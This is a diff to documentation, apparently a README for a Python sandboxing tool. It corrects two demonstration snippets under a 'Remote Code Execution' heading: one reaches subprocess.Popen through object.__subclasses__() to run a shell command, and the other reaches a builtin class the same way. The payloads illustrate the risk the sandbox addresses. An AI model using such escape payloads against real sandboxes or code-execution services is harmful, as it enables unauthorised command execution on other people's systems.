@@ -259,7 +259,7 @@ Without sandbox, you can try
 ![Remote Code Execution](RCE.png)
 
 ```python
-[_ for _ in [c for c in add.__class__.__base__.__subclasses__()
+[_ for _ in [c for c in "".__class__.__base__.__subclasses__()
  if c.__name__ == "Popen"]
 ][0]("cat README.md",shell=True,stdout=-1,text=True).communicate()[0]
 ```
@@ -274,6 +274,6 @@ claude
 ```
 
 ```python
-[_ for _ in [c for c in add.__class__.__base__.__subclasses__()
- if c.__name__ == "count"]][0]()]
+[_ for _ in [c for c in "".__class__.__base__.__subclasses__()
+ if c.__name__ == "count"][0]()]
 ```
